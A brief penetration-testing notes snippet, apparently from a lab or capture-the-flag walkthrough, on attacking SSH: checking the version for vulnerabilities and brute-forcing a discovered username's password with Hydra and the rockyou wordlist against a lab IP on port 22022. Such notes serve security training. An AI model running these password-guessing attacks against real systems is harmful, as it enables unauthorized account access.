
#### Check for SSH version and associated vulnerabilities in software


---
#### Password Cracking

If you find any valid user names via other methods

Try cracking password using HYDRA

Example:
```sh
hydra -l sunny -P '/usr/share/wordlists/rockyou.txt' 10.10.10.76 ssh -s 22022
```
where sunny is the valid user name found during enum